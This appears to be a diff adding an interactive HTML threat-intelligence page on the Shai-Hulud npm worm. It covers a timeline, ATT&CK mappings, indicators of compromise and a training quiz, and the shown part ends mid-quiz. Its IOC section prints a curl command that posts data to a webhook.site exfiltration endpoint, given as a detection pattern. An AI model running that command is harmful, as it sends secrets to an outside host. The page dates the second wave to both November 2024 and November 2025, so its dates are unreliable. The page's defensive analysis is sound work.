@@ -1,0 +1,1858 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SHAI-HULUD THREAT INTELLIGENCE :: NPM SUPPLY CHAIN COMPROMISE</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&amp;family=Rajdhani:wght@600;700&amp;display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-primary: #0a0a0a;
+            --bg-secondary: #1a1a1a;
+            --bg-tertiary: #2a2a2a;
+            --text-primary: #e5e5e5;
+            --text-secondary: #a3a3a3;
+            --red-primary: #dc2626;
+            --red-secondary: #ef4444;
+            --red-dark: #991b1b;
+            --red-glow: rgba(220, 38, 38, 0.3);
+            --gray-border: #404040;
+        }
+
+        @keyframes scanline {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100vh); }
+        }
+
+        @keyframes glitch {
+            0%, 90%, 100% { transform: translate(0); }
+            92% { transform: translate(-2px, 2px); }
+            94% { transform: translate(-2px, -2px); }
+            96% { transform: translate(2px, 2px); }
+            98% { transform: translate(2px, -2px); }
+        }
+
+        @keyframes pulse-red {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+            51% { opacity: 1; }
+            52% { opacity: 0.9; }
+        }
+
+        @keyframes slide-in {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        @keyframes terminal-cursor {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.6;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 0, 0, 0.15) 0px,
+                transparent 1px,
+                transparent 2px,
+                rgba(0, 0, 0, 0.15) 3px
+            );
+            pointer-events: none;
+            z-index: 1000;
+            animation: flicker 3s infinite;
+        }
+
+        .scanline {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(transparent, var(--red-primary), transparent);
+            animation: scanline 8s linear infinite;
+            pointer-events: none;
+            z-index: 999;
+            opacity: 0.3;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            border-bottom: 2px solid var(--red-primary);
+            padding: 30px 0;
+            margin-bottom: 40px;
+            position: relative;
+            background: linear-gradient(180deg, var(--bg-secondary) 0%, var(--bg-primary) 100%);
+        }
+
+        .header-glitch {
+            animation: glitch 5s infinite;
+        }
+
+        h1 {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 2.5em;
+            font-weight: 800;
+            color: var(--red-primary);
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 0 0 10px var(--red-glow), 0 0 20px var(--red-glow);
+            margin-bottom: 10px;
+        }
+
+        .threat-level {
+            display: inline-block;
+            padding: 8px 16px;
+            background: var(--red-dark);
+            color: var(--text-primary);
+            font-weight: 700;
+            border-left: 4px solid var(--red-primary);
+            animation: pulse-red 2s infinite;
+            margin-top: 10px;
+        }
+
+        .threat-level::before {
+            content: '⚠ ';
+            color: var(--red-primary);
+        }
+
+        .nav-tabs {
+            display: flex;
+            gap: 10px;
+            margin: 30px 0;
+            flex-wrap: wrap;
+        }
+
+        .tab-btn {
+            background: var(--bg-secondary);
+            border: 1px solid var(--gray-border);
+            color: var(--text-secondary);
+            padding: 12px 24px;
+            cursor: pointer;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9em;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .tab-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, var(--red-glow), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .tab-btn:hover::before {
+            left: 100%;
+        }
+
+        .tab-btn:hover {
+            border-color: var(--red-primary);
+            color: var(--text-primary);
+            box-shadow: 0 0 10px var(--red-glow);
+        }
+
+        .tab-btn.active {
+            background: var(--red-dark);
+            border-color: var(--red-primary);
+            color: var(--text-primary);
+            box-shadow: inset 0 0 10px var(--red-glow);
+        }
+
+        .tab-content {
+            display: none;
+            animation: slide-in 0.5s ease;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .section {
+            background: var(--bg-secondary);
+            border: 1px solid var(--gray-border);
+            border-left: 4px solid var(--red-primary);
+            padding: 30px;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .section::before {
+            content: attr(data-label);
+            position: absolute;
+            top: -12px;
+            left: 20px;
+            background: var(--bg-primary);
+            padding: 0 10px;
+            color: var(--red-primary);
+            font-size: 0.8em;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        h2 {
+            font-family: 'Rajdhani', sans-serif;
+            color: var(--red-secondary);
+            font-size: 1.8em;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        h3 {
+            font-family: 'Rajdhani', sans-serif;
+            color: var(--red-secondary);
+            font-size: 1.3em;
+            margin: 20px 0 10px 0;
+            text-transform: uppercase;
+        }
+
+        .timeline {
+            position: relative;
+            padding-left: 40px;
+        }
+
+        .timeline::before {
+            content: '';
+            position: absolute;
+            left: 15px;
+            top: 0;
+            bottom: 0;
+            width: 2px;
+            background: var(--gray-border);
+        }
+
+        .timeline-item {
+            position: relative;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--gray-border);
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .timeline-item:hover {
+            border-color: var(--red-primary);
+            box-shadow: 0 0 20px var(--red-glow);
+            transform: translateX(5px);
+        }
+
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            left: -25px;
+            top: 25px;
+            width: 12px;
+            height: 12px;
+            background: var(--red-primary);
+            border: 2px solid var(--bg-primary);
+            border-radius: 50%;
+            box-shadow: 0 0 10px var(--red-glow);
+        }
+
+        .timeline-date {
+            color: var(--red-primary);
+            font-weight: 700;
+            font-size: 0.9em;
+            margin-bottom: 8px;
+        }
+
+        .mitre-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .mitre-card {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--gray-border);
+            padding: 20px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .mitre-card:hover {
+            border-color: var(--red-primary);
+            transform: translateY(-5px);
+            box-shadow: 0 5px 20px var(--red-glow);
+        }
+
+        .mitre-id {
+            color: var(--red-primary);
+            font-weight: 700;
+            font-size: 0.9em;
+            margin-bottom: 10px;
+        }
+
+        .mitre-tactic {
+            color: var(--text-primary);
+            font-weight: 700;
+            margin-bottom: 8px;
+            font-size: 1.1em;
+        }
+
+        .mitre-description {
+            color: var(--text-secondary);
+            font-size: 0.85em;
+            line-height: 1.5;
+        }
+
+        .ioc-checker {
+            background: var(--bg-tertiary);
+            padding: 20px;
+            border: 1px solid var(--gray-border);
+            margin-top: 20px;
+        }
+
+        .ioc-input {
+            width: 100%;
+            background: var(--bg-primary);
+            border: 1px solid var(--gray-border);
+            color: var(--text-primary);
+            padding: 15px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.95em;
+            margin-bottom: 15px;
+            transition: all 0.3s ease;
+        }
+
+        .ioc-input:focus {
+            outline: none;
+            border-color: var(--red-primary);
+            box-shadow: 0 0 10px var(--red-glow);
+        }
+
+        .btn {
+            background: var(--red-dark);
+            border: 1px solid var(--red-primary);
+            color: var(--text-primary);
+            padding: 12px 30px;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            font-size: 0.9em;
+        }
+
+        .btn:hover {
+            background: var(--red-primary);
+            box-shadow: 0 0 20px var(--red-glow);
+            transform: translateY(-2px);
+        }
+
+        .result-box {
+            margin-top: 20px;
+            padding: 20px;
+            background: var(--bg-primary);
+            border: 1px solid var(--gray-border);
+            min-height: 100px;
+            font-size: 0.9em;
+        }
+
+        .threat-indicator {
+            display: inline-block;
+            padding: 4px 8px;
+            background: var(--red-dark);
+            color: var(--text-primary);
+            font-size: 0.8em;
+            font-weight: 700;
+            margin: 2px;
+            border-left: 3px solid var(--red-primary);
+        }
+
+        .info-box {
+            background: var(--bg-tertiary);
+            border-left: 4px solid var(--red-primary);
+            padding: 15px;
+            margin: 15px 0;
+            font-size: 0.9em;
+        }
+
+        .info-box strong {
+            color: var(--red-secondary);
+        }
+
+        .code-block {
+            background: var(--bg-primary);
+            border: 1px solid var(--gray-border);
+            padding: 20px;
+            margin: 15px 0;
+            overflow-x: auto;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            position: relative;
+        }
+
+        .code-block::before {
+            content: '> MALICIOUS CODE SAMPLE';
+            position: absolute;
+            top: -12px;
+            left: 15px;
+            background: var(--bg-primary);
+            color: var(--red-primary);
+            padding: 0 10px;
+            font-size: 0.75em;
+            font-weight: 700;
+        }
+
+        .interactive-module {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--gray-border);
+            padding: 25px;
+            margin: 20px 0;
+        }
+
+        .question {
+            color: var(--text-primary);
+            font-weight: 700;
+            margin-bottom: 15px;
+            font-size: 1.05em;
+        }
+
+        .options {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .option {
+            background: var(--bg-primary);
+            border: 1px solid var(--gray-border);
+            padding: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .option:hover {
+            border-color: var(--red-primary);
+            box-shadow: 0 0 10px var(--red-glow);
+        }
+
+        .option.correct {
+            border-color: #10b981;
+            background: rgba(16, 185, 129, 0.1);
+        }
+
+        .option.incorrect {
+            border-color: var(--red-primary);
+            background: var(--red-glow);
+        }
+
+        .feedback {
+            margin-top: 15px;
+            padding: 15px;
+            background: var(--bg-primary);
+            border-left: 4px solid var(--red-primary);
+            display: none;
+        }
+
+        .feedback.show {
+            display: block;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 30px;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--gray-border);
+            margin: 20px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--red-dark), var(--red-primary));
+            transition: width 0.5s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-primary);
+            font-weight: 700;
+            font-size: 0.85em;
+        }
+
+        .terminal-output {
+            background: var(--bg-primary);
+            border: 1px solid var(--gray-border);
+            padding: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            height: 300px;
+            overflow-y: auto;
+            margin: 20px 0;
+        }
+
+        .terminal-line {
+            margin: 5px 0;
+            opacity: 0;
+            animation: slide-in 0.3s ease forwards;
+        }
+
+        .terminal-line.error {
+            color: var(--red-primary);
+        }
+
+        .terminal-line.warning {
+            color: #fbbf24;
+        }
+
+        .terminal-line.success {
+            color: #10b981;
+        }
+
+        .terminal-cursor::after {
+            content: '█';
+            animation: terminal-cursor 1s infinite;
+        }
+
+        ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        ul li {
+            padding: 8px 0;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        ul li::before {
+            content: '▸';
+            position: absolute;
+            left: 0;
+            color: var(--red-primary);
+        }
+
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .stat-card {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--gray-border);
+            padding: 25px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .stat-card:hover {
+            border-color: var(--red-primary);
+            box-shadow: 0 0 20px var(--red-glow);
+        }
+
+        .stat-number {
+            font-size: 3em;
+            font-weight: 800;
+            color: var(--red-primary);
+            font-family: 'Rajdhani', sans-serif;
+            text-shadow: 0 0 10px var(--red-glow);
+        }
+
+        .stat-label {
+            color: var(--text-secondary);
+            font-size: 0.9em;
+            margin-top: 10px;
+            text-transform: uppercase;
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 1.8em;
+            }
+
+            .nav-tabs {
+                flex-direction: column;
+            }
+
+            .mitre-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .grid-2 {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head><body><div class="scanline"></div>
+<div class="container"><header>
+<div class="header-glitch">
+<h1>⚡ SHAI-HULUD :: NPM WORM</h1>
+<p style="color: var(--text-secondary); font-size: 0.9em;">SUPPLY CHAIN COMPROMISE // THREAT INTELLIGENCE ANALYSIS</p>
+<div style="display: flex; align-items: center; gap: 15px; margin-top: 10px; flex-wrap: wrap;">
+<div class="threat-level">THREAT LEVEL: CRITICAL // ACTIVE CAMPAIGN</div>
+<button class="btn" style="padding: 8px 16px; font-size: 0.85em;" onclick="downloadReport()"> 📥 DOWNLOAD REPORT </button></div>
+</div>
+</header>
+<div class="nav-tabs"><button class="tab-btn active" onclick="switchTab('overview')">// OVERVIEW</button> <button class="tab-btn" onclick="switchTab('timeline')">// TIMELINE</button> <button class="tab-btn" onclick="switchTab('mitre')">// MITRE ATT&amp;CK</button> <button class="tab-btn" onclick="switchTab('ioc')">// IOC CHECKER</button> <button class="tab-btn" onclick="switchTab('learning')">// INTERACTIVE LEARNING</button> <button class="tab-btn" onclick="switchTab('defense')">// DEFENSE PLAYBOOK</button></div>
+<!-- OVERVIEW TAB -->
+<div id="overview" class="tab-content active">
+<div class="section" data-label="THREAT SUMMARY">
+<h2>Campaign Overview</h2>
+<p>Shai-Hulud is a sophisticated, self-replicating malware worm targeting the NPM (Node Package Manager) ecosystem. Named after the sandworm from Frank Herbert's "Dune," this threat represents a significant evolution in software supply chain attacks.</p>
+<div class="grid-2">
+<div class="stat-card">
+<div class="stat-number">300+</div>
+<div class="stat-label">Compromised NPM Packages</div>
+</div>
+<div class="stat-card">
+<div class="stat-number">25,000+</div>
+<div class="stat-label">Affected Repositories</div>
+</div>
+<div class="stat-card">
+<div class="stat-number">2</div>
+<div class="stat-label">Major Attack Waves</div>
+</div>
+<div class="stat-card">
+<div class="stat-number">700+</div>
+<div class="stat-label">GitHub Repos Infected</div>
+</div>
+</div>
+</div>
+<div class="section" data-label="ATTACK CHARACTERISTICS">
+<h2>Key Attack Features</h2>
+<h3>Initial Compromise Vector</h3>
+<ul>
+<li>Compromised NPM maintainer accounts via phishing campaigns</li>
+<li>Stolen GitHub Personal Access Tokens (PATs)</li>
+<li>Reused or weak credentials</li>
+<li>Social engineering and account recovery abuse</li>
+</ul>
+<h3>Malicious Capabilities</h3>
+<ul>
+<li><strong>Credential Harvesting:</strong> Uses TruffleHog to scan for secrets, API keys, tokens</li>
+<li><strong>Self-Replication:</strong> Automatically propagates to top 20 packages under victim's control</li>
+<li><strong>Data Exfiltration:</strong> Creates public GitHub repos named "Shai-Hulud" with stolen data</li>
+<li><strong>Persistence:</strong> Injects malicious GitHub Actions workflows (shai-hulud-workflow.yml)</li>
+<li><strong>Wiper Functionality:</strong> Destroys victim's home directory if exfiltration fails</li>
+<li><strong>AI-Generated Code:</strong> Suspected to use LLM assistance (contains emojis and comments)</li>
+</ul>
+<h3>Second Wave Enhancements (Nov 2024)</h3>
+<div class="info-box"><strong>NEW:</strong> The second wave introduces preinstall script execution via Bun runtime, significantly expanding the attack surface to include build and runtime environments. The malware is now more aggressive with catastrophic data destruction capabilities.</div>
+</div>
+<div class="section" data-label="TARGETED CREDENTIALS">
+<h2>Targeted Secrets &amp; Credentials</h2>
+<div class="grid-2">
+<div>
+<div class="threat-indicator">GITHUB PATs</div>
+<div class="threat-indicator">NPM TOKENS</div>
+<div class="threat-indicator">AWS KEYS</div>
+<div class="threat-indicator">AZURE CREDENTIALS</div>
+</div>
+<div>
+<div class="threat-indicator">GCP TOKENS</div>
+<div class="threat-indicator">SLACK WEBHOOKS</div>
+<div class="threat-indicator">CI/CD SECRETS</div>
+<div class="threat-indicator">ENV VARIABLES</div>
+</div>
+</div>
+</div>
+<div class="section" data-label="LIVE THREAT FEED" style="margin-top: 30px;">
+<h2>Simulated Threat Detection Feed</h2>
+<p style="color: var(--text-secondary); margin-bottom: 15px; font-size: 0.9em;">Real-time simulation of threat detection system (for training purposes)</p>
+<div id="threatFeed" class="terminal-output" style="height: 250px;">
+<div class="terminal-line" style="animation-delay: 0s;">&gt;&gt;&gt; Threat monitoring system initialized...</div>
+<div class="terminal-line" style="animation-delay: 0.2s;">&gt;&gt;&gt; Scanning for Shai-Hulud indicators across 1,247 repositories...</div>
+</div>
+</div>
+</div>
+<!-- TIMELINE TAB -->
+<div class="tab-content">
+<div class="section" data-label="ATTACK TIMELINE">
+<h2>Shai-Hulud Campaign Timeline</h2>
+<div class="timeline">
+<div class="timeline-item">
+<div class="timeline-date">SEPTEMBER 15, 2025 - 17:58 UTC</div>
+<h3>Initial Compromise</h3>
+<p>First NPM package compromised: rxnt-authentication. Malicious post-installation scripts begin executing.</p>
+</div>
+<div class="timeline-item">
+<div class="timeline-date">SEPTEMBER 16, 2025 - 03:46 UTC</div>
+<p>GitHub activity related to campaign begins. Malicious workflow files start appearing in repositories.</p>
+</div>
+<div class="timeline-item">
+<div class="timeline-date">SEPTEMBER 16, 2025 - 13:42 UTC</div>
+<p>Peak of initial compromise phase. 226 malicious GitHub Action workflow files pushed, 44 secret collection data.json files created.</p>
+</div>
+<div class="timeline-item">
+<div class="timeline-date">SEPTEMBER 16, 2025 - 14:00 UTC</div>
+<h3>Detection &amp; Response</h3>
+<p>Attack publicly reported. Security researchers identify worm behavior. Exfiltration endpoints disabled due to rate limiting.</p>
+</div>
+<div class="timeline-item">
+<div class="timeline-date">SEPTEMBER 16, 2025 - 18:00 UTC</div>
+<h3>Secondary Wave Begins</h3>
+<p>New victims emerge as worm continues spreading through previously compromised packages. Self-replicating mechanism proves persistent.</p>
+</div>
+<div class="timeline-item">
+<div class="timeline-date">SEPTEMBER 17-23, 2025</div>
+<p>Security community response: Over 187 packages confirmed infected. CrowdStrike confirms several public NPM packages briefly compromised. Industry-wide credential rotation underway.</p>
+</div>
+<div class="timeline-item">
+<div class="timeline-date">NOVEMBER 21-23, 2025</div>
+<h3>Second Major Campaign</h3>
+<p>New variant emerges with preinstall script execution via Bun runtime. "Sha1-Hulud: The Second Coming" repository descriptions appear. Over 25,000 repositories affected.</p>
+</div>
+<div class="timeline-item">
+<div class="timeline-date">NOVEMBER 24, 2025</div>
+<h3>Current Status</h3>
+<p>Campaign remains active. Security researchers tracking new IoCs. Enhanced wiper functionality discovered - destroys entire home directory if unable to authenticate or establish persistence.</p>
+</div>
+</div>
+</div>
+</div>
+<!-- MITRE ATT&CK TAB -->
+<div id="mitre" class="tab-content">
+<div class="section" data-label="MITRE ATT&amp;CK FRAMEWORK">
+<h2>ATT&amp;CK Techniques Mapped</h2>
+<div class="mitre-grid">
+<div class="mitre-card" onclick="showMitreDetails('T1195')">
+<div class="mitre-id">T1195.002</div>
+<div class="mitre-tactic">Supply Chain Compromise</div>
+<div class="mitre-description">Compromise Software Supply Chain - Manipulates NPM packages to distribute malicious code through trusted software distribution mechanisms.</div>
+</div>
+<div class="mitre-card" onclick="showMitreDetails('T1199')">
+<div class="mitre-id">T1199</div>
+<div class="mitre-tactic">Trusted Relationship</div>
+<div class="mitre-description">Exploits trust relationships between software maintainers and downstream consumers.</div>
+</div>
+<div class="mitre-card" onclick="showMitreDetails('T1552.001')">
+<div class="mitre-id">T1552.001</div>
+<div class="mitre-tactic">Credentials from Files</div>
+<div class="mitre-description">Uses TruffleHog to extract credentials, API keys, and tokens from configuration files and environment variables.</div>
+</div>
+<div class="mitre-card" onclick="showMitreDetails('T1552')">
+<div class="mitre-id">T1552</div>
+<div class="mitre-tactic">Unsecured Credentials</div>
+<div class="mitre-description">Targets unsecured credentials in development environments, CI/CD pipelines, and local system files.</div>
+</div>
+<div class="mitre-card" onclick="showMitreDetails('T1005')">
+<div class="mitre-id">T1005</div>
+<div class="mitre-tactic">Data from Local System</div>
+<div class="mitre-description">Harvests sensitive data from victim's local development environment including secrets and configuration files.</div>
+</div>
+<div class="mitre-card" onclick="showMitreDetails('T1567')">
+<div class="mitre-id">T1567.002</div>
+<div class="mitre-tactic">Exfiltration Over Web Service</div>
+<div class="mitre-description">Exfiltrates stolen credentials to webhook.site and public GitHub repositories.</div>
+</div>
+<div class="mitre-card" onclick="showMitreDetails('T1525')">
+<div class="mitre-id">T1525</div>
+<div class="mitre-tactic">Implant Internal Image</div>
+<div class="mitre-description">Injects malicious GitHub Actions workflows to establish persistence and continued access.</div>
+</div>
+<div class="mitre-card" onclick="showMitreDetails('T1578')">
+<div class="mitre-id">T1578</div>
+<div class="mitre-tactic">Modify Cloud Compute Infrastructure</div>
+<div class="mitre-description">Converts private repositories to public and creates new repositories under victim's control.</div>
+</div>
+<div class="mitre-card" onclick="showMitreDetails('T1485')">
+<div class="mitre-id">T1485</div>
+<div class="mitre-tactic">Data Destruction</div>
+<div class="mitre-description">Second wave includes wiper functionality that destroys victim's entire home directory if exfiltration fails.</div>
+</div>
+<div class="mitre-card" onclick="showMitreDetails('T1059.004')">
+<div class="mitre-id">T1059.004</div>
+<div class="mitre-tactic">Command and Scripting Interpreter: Unix Shell</div>
+<div class="mitre-description">Executes malicious bash scripts and uses curl commands for data exfiltration.</div>
+</div>
+<div class="mitre-card" onclick="showMitreDetails('T1027')">
+<div class="mitre-id">T1027</div>
+<div class="mitre-tactic">Obfuscated Files or Information</div>
+<div class="mitre-description">Uses double-base64 encoding for data exfiltration and bundles malicious code within legitimate work modules.</div>
+</div>
+<div class="mitre-card" onclick="showMitreDetails('T1204.002')">
+<div class="mitre-id">T1204.002</div>
+<div class="mitre-tactic">User Execution: Malicious File</div>
+<div class="mitre-description">Executes when developers install compromised NPM packages via npm install commands.</div>
+</div>
+</div>
+<div class="info-box" style="margin-top: 30px;"><strong>Kill Chain Analysis:</strong> This attack demonstrates a complete kill chain from initial access through impact, leveraging legitimate tools (TruffleHog, npm, GitHub) to evade detection while achieving persistence and data exfiltration.</div>
+</div>
+</div>
+<!-- IOC CHECKER TAB -->
+<div id="ioc" class="tab-content">
+<div class="section" data-label="INDICATORS OF COMPROMISE">
+<h2>IOC Detection &amp; Analysis</h2>
+<div class="ioc-checker">
+<h3>Check for Compromised Packages</h3>
+<p style="color: var(--text-secondary); margin-bottom: 15px;">Enter a package name to check against known compromised packages:</p>
+<input type="text" class="ioc-input" id="packageInput" placeholder="e.g., @ctrl/tinycolor, rxnt-authentication"> <button class="btn" onclick="checkIOC()">SCAN PACKAGE</button>
+<div id="iocResult" class="result-box"></div>
+</div>
+<div class="section" data-label="KNOWN IOCS" style="margin-top: 30px;">
+<h3>Known Indicators of Compromise</h3>
+<h3 style="margin-top: 25px;">File Indicators</h3>
+<div class="code-block">
+<div style="color: var(--red-primary);">// GitHub Workflow Files</div>
+.github/workflows/shai-hulud-workflow.yml
+<div style="color: var(--red-primary); margin-top: 15px;">// Malicious Scripts</div>
+setup_bun.js bun_environment.js bundle.js (&gt;3MB size)
+<div style="color: var(--red-primary); margin-top: 15px;">// Data Exfiltration Files</div>
+data.json (in public Shai-Hulud repos)</div>
+<h3 style="margin-top: 25px;">Repository Indicators</h3>
+<ul>
+<li>Public repositories named "Shai-Hulud" or "Sha1-Hulud"</li>
+<li>Repositories with description "Sha1-Hulud: The Second Coming"</li>
+<li>Branches named "shai-hulud"</li>
+<li>Repositories tagged with "Shai-Hulud Migration" and -migration suffix</li>
+<li>Unexpected conversion of private repos to public</li>
+</ul>
+<h3 style="margin-top: 25px;">Network Indicators</h3>
+<div class="code-block">
+<div style="color: var(--red-primary);">// Exfiltration Endpoints</div>
+webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7
+<div style="color: var(--red-primary); margin-top: 15px;">// Suspicious Patterns</div>
+curl -d "$CONTENTS" https://webhook.site/* POST requests with double base64 encoding</div>
+<h3 style="margin-top: 25px;">Sample Compromised Packages</h3>
+<div class="grid-2">
+<div>
+<div class="threat-indicator">rxnt-authentication</div>
+<div class="threat-indicator">@ctrl/tinycolor</div>
+<div class="threat-indicator">CrowdStrike packages</div>
+<div class="threat-indicator">@types/* variations</div>
+</div>
+<div>
+<div class="threat-indicator">chalk variants</div>
+<div class="threat-indicator">debug compromises</div>
+<div class="threat-indicator">187+ additional packages</div>
+<div class="threat-indicator">300+ total infected</div>
+</div>
+</div>
+</div>
+<div class="section" data-label="BEHAVIORAL INDICATORS" style="margin-top: 30px;">
+<h3>Suspicious Behavioral Patterns</h3>
+<ul>
+<li>Unexpected execution of postinstall or preinstall scripts</li>
+<li>Installation of Bun runtime without explicit user action</li>
+<li>Large bundle.js files (&gt;3MB) being downloaded</li>
+<li>TruffleHog execution in development environment</li>
+<li>Automated npm package publishing without user action</li>
+<li>Creation of new GitHub repositories with "Shai-Hulud" naming</li>
+<li>Modification of .github/workflows/ directories</li>
+<li>Elevated API activity on npm and GitHub accounts</li>
+</ul>
+</div>
+</div>
+</div>
+<!-- LEARNING TAB -->
+<div id="learning" class="tab-content">
+<div class="section" data-label="INTERACTIVE TRAINING">
+<h2>Threat Analysis Training</h2>
+<p style="color: var(--text-secondary); margin-bottom: 25px;">Test your understanding of the Shai-Hulud attack campaign. Progress is saved locally.</p>
+<div class="progress-bar">
+<div class="progress-fill" id="progressBar" style="width: 0%;">0% COMPLETE</div>
+</div>
+<div class="interactive-module">
+<div class="question">Question 1: What is the primary initial access vector for Shai-Hulud?</div>
+<div class="options">
+<div class="option" onclick="checkAnswer(this, false, 1)">A) Zero-day vulnerability in NPM registry</div>
+<div class="option" onclick="checkAnswer(this, true, 1)">B) Compromised maintainer accounts via phishing and stolen tokens</div>
+<div class="option" onclick="checkAnswer(this, false, 1)">C) SQL injection in package search functionality</div>
+<div class="option" onclick="checkAnswer(this, false, 1)">D) Cross-site scripting in package description</div>
+</div>
+<div class="feedback" id="feedback1"><strong>Correct!</strong> Shai-Hulud gains initial access through compromised NPM maintainer accounts, typically via phishing campaigns, stolen Personal Access Tokens (PATs), or credential reuse. This social engineering approach is more reliable than technical exploits and allows the attacker to publish malicious packages under legitimate maintainer credentials.</div>
+</div>
+<div class="interactive-module">
+<div class="question">Question 2: Which legitimate security tool does Shai-Hulud weaponize for credential harvesting?</div>
+<div class="options">
+<div class="option" onclick="checkAnswer(this, false, 2)">A) Metasploit Framework</div>
+<div class="option" onclick="checkAnswer(this, true, 2)">B) TruffleHog credential scanner</div>
+<div class="option" onclick="checkAnswer(this, false, 2)">C) Nmap port scanner</div>
+<div class="option" onclick="checkAnswer(this, false, 2)">D) Wireshark packet analyzer</div>
+</div>
+<div class="feedback" id="feedback2"><strong>Correct!</strong> Shai-Hulud uses TruffleHog, a legitimate open-source tool designed to scan for exposed credentials. By weaponizing security tools, the malware can evade detection since these tools are commonly found in development environments. This "living off the land" technique makes malicious activity blend in with normal security practices.</div>
+</div>
+<div class="interactive-module">
+<div class="question">Question 3: What is the self-replication mechanism used by Shai-Hulud?</div>
+<div class="options">
+<div class="option" onclick="checkAnswer(this, false, 3)">A) Exploits buffer overflow in NPM client</div>
+<div class="option" onclick="checkAnswer(this, false, 3)">B) Spreads via email attachments to developers</div>
+<div class="option" onclick="checkAnswer(this, true, 3)">C) Publishes malicious versions of packages the victim maintains</div>
+<div class="option" onclick="checkAnswer(this, false, 3)">D) Uses SQL injection to modify package registry database</div>
+</div>
+<div class="feedback" id="feedback3"><strong>Correct!</strong> Once credentials are stolen, Shai-Hulud identifies the top 20 most popular packages maintained by the victim and publishes malicious versions of those packages. This creates exponential spread as downstream users install what appear to be legitimate updates from trusted maintainers. This worm-like propagation is what makes Shai-Hulud particularly dangerous and persistent.</div>
+</div>
+<div class="interactive-module">
+<div class="question">Question 4: What new capability was added in the November 2024 "Second Coming" wave?</div>
+<div class="options">
+<div class="option" onclick="checkAnswer(this, false, 4)">A) Cryptocurrency mining functionality</div>
+<div class="option" onclick="checkAnswer(this, true, 4)">B) Preinstall script execution and data wiper functionality</div>
+<div class="option" onclick="checkAnswer(this, false, 4)">C) Ransomware encryption of source code</div>
+<div class="option" onclick="checkAnswer(this, false, 4)">D) DDoS botnet capabilities</div>
+</div>
+<div class="feedback" id="feedback4"><strong>Correct!</strong> The second wave introduced two critical enhancements: (1) malicious code execution during the preinstall phase via Bun runtime, expanding the attack surface to build environments, and (2) destructive wiper functionality that destroys the victim's entire home directory if the malware fails to authenticate or establish persistence. This makes the attack both more aggressive and more dangerous.</div>
+</div>
+<div class="interactive-module">
+<div class="question">Question 5: How does Shai-Hulud achieve persistence on victim repositories?</div>
+<div class="options">
+<div class="option" onclick="checkAnswer(this, false, 5)">A) Creates hidden system services</div>
+<div class="option" onclick="checkAnswer(this, true, 5)">B) Injects malicious GitHub Actions workflows</div>
